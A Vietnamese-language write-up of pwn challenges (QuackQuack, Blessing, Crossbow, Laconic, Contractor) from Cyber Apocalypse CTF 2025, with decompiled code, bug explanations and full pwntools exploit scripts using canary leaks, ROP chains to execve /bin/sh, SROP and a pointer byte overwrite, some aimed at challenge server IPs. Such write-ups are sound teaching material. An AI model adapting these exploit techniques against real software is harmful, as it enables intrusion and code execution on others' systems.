--- 
title: Cyber Apocalypse CTF 2025 Tales from Eldoria
date: 2025-03-27 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
published: false
---

## QuackQuack

checksec: 

![image](https://hackmd.io/_uploads/S1XN2q7T1l.png)


- chương trình khá ngắn gọn , đầu tiên ta sẽ được input vào `buf` 0x66 bytes , tiếp theo check xem chuỗi "Quack Quack" có trong `buf` không và trả về địa chỉ chứa chuỗi này , cuối cùng ta sẽ được read vào `v3` và tất nhiên ở đây xảy ra `bof`

```c
unsigned __int64 duckling()
{
  char *v1; // [rsp+8h] [rbp-88h]
  char buf[32]; // [rsp+10h] [rbp-80h] BYREF
  char v3[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v3, 0, 80);
  printf("Quack the Duck!\n\n> ");
  fflush(_bss_start);
  read(0, buf, 0x66uLL);
  v1 = strstr(buf, "Quack Quack ");
  if ( !v1 )
  {
    error("Where are your Quack Manners?!\n");
    exit(1312);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
  read(0, v3, 0x6AuLL);
  puts("Did you really expect to win a fight against a Duck?!\n");
  return v4 - __readfsqword(0x28u);
}
```

- điều kiện để có thể giải được bài này là cần leak canary , vì bài đã có 1 hàm lấy shell sẵn: 

```c
unsigned __int64 duck_attack()
{
  char buf; // [rsp+3h] [rbp-Dh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("\nError opening flag.txt, please contact an Administrator\n");
    exit(1);
  }
  while ( read(fd, &buf, 1uLL) > 0 )
    fputc(buf, _bss_start);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```

- và ta cần chú ý đoạn này , nó sẽ in ra dữ liệu của v1+32 và v1 chính là địa chỉ được trả về bởi hàm `strstr` , vậy ta cần setup thế nào làm sao cho v1 sẽ là canary-31 là được , -31 bởi vì printf sẽ leak cho đến byte NULL , và như ta biết thì byte cuối của CANARY là NULL nên ta cần bắt đầu in với canary+1  
```c
printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
```

- sau khi leak xong thì ret2win thôi không có gì đặc biệt

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./quack_quack_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.52.195',39106)
pl = b'a'*0x59
pl += b'Quack Quack ' + b'a'
input()
p.sendafter(b'> ',pl)
p.recvuntil(b'Quack Quack ')

canary = u64(b'\x00' + p.recv(7))
print(hex(canary))
input()
p.send(b'a'*0x58+p64(canary) + p64(0x406000-0x100) + p64(0x000000000040139A))
p.interactive()
```

## Blessing

- bài này trông khá là vui 
### analys 

- chương trình chỉ đơn giản là malloc() với 1 size rất lớn , sau đó gán giá trị 1 cho địa chỉ vừa được malloc trả về , tiếp theo là in ra địa chỉ này và yêu cầu ta nhập 1 size xong rồi malloc() với size đó
- tiếp theo ta sẽ được read vào `chunk` này với số byte là size vừa nhập  và in dữ liệu của nó ra , check xem v6 có NULL không , nếu NULL thì ta sẽ gọi hàm win và ta sẽ có flag  

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  _QWORD *v6; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  size = 0LL;
  v6 = malloc(0x30000uLL);
  *v6 = 1LL;
  printstr(
    "In the ancient realm of Eldoria, a roaming bard grants you good luck and offers you a gift!\n"
    "\n"
    "Please accept this: ");
  printf("%p", v6);
  sleep(1u);
  for ( i = 0LL; i <= 0xD; ++i )
  {
    printf("\b \b");
    usleep(0xEA60u);
  }
  puts("\n");
  printf(
    "%s[%sBard%s]: Now, I want something in return...\n\nHow about a song?\n\nGive me the song's length: ",
    "\x1B[1;34m",
    "\x1B[1;32m",
    "\x1B[1;34m");
  __isoc99_scanf("%lu", &size);
  buf = malloc(size);
  printf("\n%s[%sBard%s]: Excellent! Now tell me the song: ", "\x1B[1;34m", "\x1B[1;32m", "\x1B[1;34m");
  read(0, buf, size);
  *(_QWORD *)((char *)buf + size - 1) = 0LL;
  write(1, buf, size);
  if ( *v6 )
    printf("\n%s[%sBard%s]: Your song was not as good as expected...\n\n", "\x1B[1;31m", "\x1B[1;32m", "\x1B[1;31m");
  else
    read_flag();
  return 0;
}
```

- ở đây ta cần biết khi malloc với 1 size lớn hơn top chunk thì nó sẽ dùng `mmap` để phân bổ chunk này và nó sẽ nằm dưới địa chỉ libc

![image](https://hackmd.io/_uploads/Syg9xsXayl.png)

- ở đây ta cần để ý một chút , khi ta read thì nó sẽ truyền size vào rdx và cộng thêm nếu malloc 1 size lớn quá thì nó sẽ trả về NULL , ta chỉ cần kết hợp với đoạn này , ở đây size sẽ là địa chỉ được `mmap` và buf sẽ là 0 và 1 cách trùng hợp nó sẽ gán NULL cho `v6` và ta có thể lấy flag  

```c
*(_QWORD *)((char *)buf + size - 1) = 0LL;
```

![image](https://hackmd.io/_uploads/SJSCTjQayl.png)


- và đây sẽ là đoạn nó gán NULL 

![image](https://hackmd.io/_uploads/H1_WRoQ6kg.png)

- và ta có flag 

![image](https://hackmd.io/_uploads/HyTMCo76yl.png)

## Crossbow

- 1 bài cũng khá là hay

- main: 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(&_stdin_FILE, 0LL, 2LL, 0LL);
  setvbuf(&_stdout_FILE, 0LL, 2LL, 0LL);
  alarm(4882LL);
  banner();
  training();
  return 0;
}
```

- training : nó chỉ in in1 số thứ và gọi  `target_dummy` 

```c
__int64 __fastcall training(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // r8d
  int v7; // r9d
  char v9[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  target_dummy(v9);
  return printf(
           (unsigned int)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",
           (unsigned int)"\x1B[1;34m",
           (unsigned int)"\x1B[1;33m",
           (unsigned int)"\x1B[1;34m",
           v6,
           v7);
}
```

- target_dummy: ta sẽ được nhập 1 size và size này sẽ được tính toán để tạo ra 1 con trỏ chứa địa chỉ được trả về bởi calloc (a1+input*8) , với a1 là địa chỉ stack ở hàm `training`  , calloc ở đây sẽ trả về 1 địa chỉ không ở trong vùng heap và nó nằm trước libc 


- và cuối cùng là ta sẽ được nhập dữ liệu vào chunk 

```c
__int64 __fastcall target_dummy(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 result; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312LL);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1LL, 128LL);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969LL);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v13,
    v14);
  result = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128LL, &_stdin_FILE);
  if ( !result )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v16,
      v17);
    exit(69LL);
  }
  return result;
}
```

- ý tưởng của bài này sẽ là như sau: 

    - ta sẽ nhập 1 index để overwrite `rbp` của `target_dummy` thành địa chỉ chunk được calloc ra , và ta sẽ input vào đó 1 `rop_chain` để lấy shell , khi hàm `target_dummy` return về `training` , lúc này `rbp` của hàm `training` cũng chính là chunk được `calloc` ra , và nó sẽ tiếp tục `leave_ret` 1 lần nữa và nó sẽ return về rbp+8  , vậy ta sẽ đặt 1 rop_chain ở đó để lấy được shell dễ dàng 

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./crossbow',checksec=False)

p = process()
#p = remote('94.237.55.91',35353)

pop_rax = 0x401001 # pop rax ; ret
pop_rdi = 0x0401d6c # pop rdi ; ret
pop_rsi = 0x40566b # pop rsi ; ret
pop_rdx = 0x401139 # pop rdx ; ret
syscall = 0x404b51 # syscall; ret;
hehe = 0x4020f5 # mov qword ptr [rdi], rax ; ret

sh = b"/bin/sh\x00"
bss = 0x40e220

payload = flat(
    [
        pop_rax,
        sh,
        pop_rdi,
        bss,
        hehe,
        pop_rdi,
        bss,
        pop_rsi,
        0,
        pop_rdx,
        0,
        pop_rax,
        0x3b,
        syscall
        ]
)

payload = b"A"*8 + payload

input()
p.sendlineafter(b":", b"-2")
p.sendlineafter(b">", payload)

p.interactive()

```

## Laconic

- bài này chỉ là 1 bài `SROP` thông thường , không có gì quá đặc biệt

- ta thấy nó sẽ gồm những đoạn code asm , và ta cũng có `bof`  + các gadget như `pop_rax` và `syscall` 

![image](https://hackmd.io/_uploads/H1k7O2XTyx.png)

- và hơn thế nữa là có luôn địa chỉ chứa /bin/sh  và ta sẽ đỡ phải tạo nó 

![image](https://hackmd.io/_uploads/HJDlthmpkx.png)

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./laconic')

#p = process()
p = remote('94.237.60.63',58639)
"""
gdb.attach(p,gdbscript='''
           b*0x43015
           c
           ''')
           """
pop_rax = 0x0000000000043018
syscall_ret = 0x0000000000043015
bss = 0x44000-0x200

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x43238
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss
frame.rip = syscall_ret

pl = b'a'*8 + p64(pop_rax) + p64(0xf) +  p64(syscall_ret) + bytes(frame)
bss = 0x44000-0x200


input()
p.send(pl)

p.interactive()
```

## Contractor

checksec: 

```
[*] '/home/ploi/pwn/Cyber_Apocalypse_CTF_2025/pwn_contractor/challenge/contractor_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

- 1 bài khá là dài , ta sẽ phân tích từng cái một ở bài này  

- main: 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  int v5; // [rsp+8h] [rbp-20h] BYREF
  int v6; // [rsp+Ch] [rbp-1Ch]
  void *s; // [rsp+10h] [rbp-18h]
  char s1[4]; // [rsp+1Ch] [rbp-Ch] BYREF
  unsigned __int64 v9; // [rsp+20h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v3 = alloca(304LL);
  s = &v5;
  memset(&v5, 0, 0x128uLL);
  printf(
    "%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some "
    "things about you.. Please introduce yourself. What is your name?\n"
    "\n"
    "> ",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xFF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 16) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: That's quite the reason why! And what is your age again?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  __isoc99_scanf("%ld", (char *)s + 272);
  printf(
    "\n"
    "[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n"
    "\n"
    "> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 280) = safe_buffer;
  }
  printf(
    "\n"
    "[%sSir Alaric%s]: So, to sum things up: \n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n"
    "\t[Name]: %s\n"
    "\t[Reason to join]: %s\n"
    "\t[Age]: %ld\n"
    "\t[Specialty]: %s\n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n",
    "\x1B[1;33m",
    "\x1B[1;34m",
    (const char *)s,
    (const char *)s + 16,
    *((_QWORD *)s + 34),
    (const char *)s + 280);
  v6 = 0;
  printf(
    "[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n",
    "\x1B[1;33m",
    "\x1B[1;34m");
  do
  {
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    __isoc99_scanf("%d", &v5);
    if ( v5 == 4 )
    {
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 0xFF; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        *((_BYTE *)s + i + 280) = safe_buffer;
      }
      ++v6;
    }
    else
    {
      if ( v5 > 4 )
        goto LABEL_36;
      switch ( v5 )
      {
        case 3:
          printf(
            "\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
            "\x1B[1;34m",
            "\x1B[1;33m",
            "\x1B[1;34m");
          __isoc99_scanf("%d", (char *)s + 272);
          ++v6;
          break;
        case 1:
          printf("\n%s[%sSir Alaric%s]: Say your name again: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i) = safe_buffer;
          }
          ++v6;
          break;
        case 2:
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xFF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i + 16) = safe_buffer;
          }
          ++v6;
          break;
        default:
LABEL_36:
          printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
          exit(1312);
      }
    }
    if ( v6 == 1 )
    {
      printf(
        "\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",
        "\x1B[1;34m",
        "\x1B[1;33m",
        "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 3; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        s1[i] = safe_buffer;
      }
      if ( !strncmp(s1, "Yes", 3uLL) )
        break;
    }
  }
  while ( v6 <= 1 );
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  return 0;
}
```

- đầu tiên nó sẽ dùng alloca() để phân bổ 1 vùng nhớ ở trên stack , ta có thể thấy đoạn này nó sẽ `sub_rsp` với size được truyền vào `alloca` và đây sẽ là chỗ mấu chốt của bài 

![image](https://hackmd.io/_uploads/HJl-p27a1g.png)

- tiếp theo đơn giản là nó sẽ hỏi name , reason , age và lần input cuối cùng sẽ giúp ta bypass được `PIE` 

```c
 printf(
    "\n"
    "[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n"
    "\n"
    "> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1uLL);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 280) = safe_buffer;
  }
  printf(
    "\n"
    "[%sSir Alaric%s]: So, to sum things up: \n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n"
    "\t[Name]: %s\n"
    "\t[Reason to join]: %s\n"
    "\t[Age]: %ld\n"
    "\t[Specialty]: %s\n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n",
    "\x1B[1;33m",
    "\x1B[1;34m",
    (const char *)s,
    (const char *)s + 16,
    *((_QWORD *)s + 34),
    (const char *)s + 280);
```

- ta có thể thấy nó sẽ read 16 byte và gán byte đó vào s+i+280 , và may mắn là có 1 địa chỉ `__libc_csu_init` nối với chuỗi này 

![image](https://hackmd.io/_uploads/S11bya7TJe.png)

- giai đoạn leak PIE đã thành công , ta sẽ cùng nhau phân tích tiếp , ta sẽ có 4 option tiếp theo  và khi nhìn vào option4 thì ta thấy rõ ràng có cái gì đó không ổn , nó được read tận 0xff byte và gán từng byte vào `s+i+280` , và như lúc này ta thấy nó có thể hoàn toàn overwrite được `return_address` , nhưng ta sẽ không làm được điều này vì ở đây ta chưa hề leak được canary



```c
do
  {
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    __isoc99_scanf("%d", &v5);
    if ( v5 == 4 )
    {
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 0xFF; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        *((_BYTE *)s + i + 280) = safe_buffer;
      }
      ++v6;
    }
    else
    {
      if ( v5 > 4 )
        goto LABEL_36;
      switch ( v5 )
      {
        case 3:
          printf(
            "\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
            "\x1B[1;34m",
            "\x1B[1;33m",
            "\x1B[1;34m");
          __isoc99_scanf("%d", (char *)s + 272);
          ++v6;
          break;
        case 1:
          printf("\n%s[%sSir Alaric%s]: Say your name again: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i) = safe_buffer;
          }
          ++v6;
          break;
        case 2:
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xFF; ++i )
          {
            read(0, &safe_buffer, 1uLL);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i + 16) = safe_buffer;
          }
          ++v6;
          break;
        default:
LABEL_36:
          printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
          exit(1312);
      }
    }
    if ( v6 == 1 )
    {
      printf(
        "\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",
        "\x1B[1;34m",
        "\x1B[1;33m",
        "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 3; ++i )
      {
        read(0, &safe_buffer, 1uLL);
        if ( safe_buffer == 10 )
          break;
        s1[i] = safe_buffer;
      }
      if ( !strncmp(s1, "Yes", 3uLL) )
        break;
    }
  }
  while ( v6 <= 1 );
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  return 0;
}
```

- nhưng ta hãy nhìn kĩ lại 1 lần nữa , ở vị trí `rbp-0x18` ta có thể thấy được 1 con trỏ tới 1 địa chỉ và địa chỉ này là địa chỉ của `s`  
![image](https://hackmd.io/_uploads/S11bya7TJe.png)

- ta sẽ chú ý về đoạn này: ở đây rdx sẽ là địa chỉ được trỏ đến bởi `rbp-0x18`  , rax sẽ là biến đếm , và khi ta kết hợp với điều kiện ở trên ta hoàn toàn có thể overwrite 1 byte để khiến lần gán tiếp theo , ta sẽ gán vào đúng return_address và lấy shell , ở đây mình quên nói là bài này có sẵn hàm `win`  

```cs
0x55555555569d <main+604>    mov    byte ptr [rdx + rax + 0x118], cl     [0x7fffffffd768] <= 0x61
0x5555555556a4 <main+611>    mov    eax, dword ptr [rip + 0x2986]        EAX, [i] => 0
0x5555555556aa <main+617>    add    eax, 1                               EAX => 1 (0 + 1)                        
```

- vậy tính toán thế nào? rất đơn giản , giả sử `s` là `0x7fffffffd650`  , ret_address là `0x7fffffffd7a8`  và khoảng cách cần overwrite đến `rbp-0x18` là 0x20 bytes , lúc này ta chỉ cần làm 1 phép tính đơn giản để tìm ra lsb của địa chỉ cần ghi (ret_address-0x21)  , 0x21 vì lúc này eax đã tăng lên 1 , và nếu để ý thì `rbp-0x18` + 0x20 sẽ bằng với `ret_address` 
- nói tóm lại ta sẽ overwrite byte đó thành byte của (rbp-0x18)-1 , và lần read tiếp theo sẽ là read vào rbp+0x20 và sẽ read vào ret_address của ta , vậy ta setup byte đó sẽ là 0x1f  , sẽ cần 1 tí brute_force ở đây , vì địa chỉ stack sẽ được aligment nên sẽ có 2 trường hợp  0 hoặc là 8 , nên ta có thể lựa chọn1  trong 2 byte  (0x1f và 0x27) 

exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./contractor_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

#p = remote('83.136.249.46',59334)
gdb.attach(p,gdbscript='''
            brva 0x000000000000175E
            brva 0x000000000000194E
            brva 0x00000000000001971



           ''')
input()
p.send(b'a'*16)

input()
p.send(b'a'*256)

input()
p.sendline(b'1')

input()
p.send(b'a'*16)
p.recvuntil(b'[Specialty]: ')
p.recv(16)
exe.address = u64(p.recv(6).ljust(8,b'\x00'),16) - 0x1b50
log.info(f'leak exe: {hex(exe.address)}')

p.sendline(b'4')
pl = b'a'*28 + p32(1) + b'\x1f' + p64(exe.sym.contract)
input()
p.sendlineafter(b'at: ', pl)

p.interactive()
```

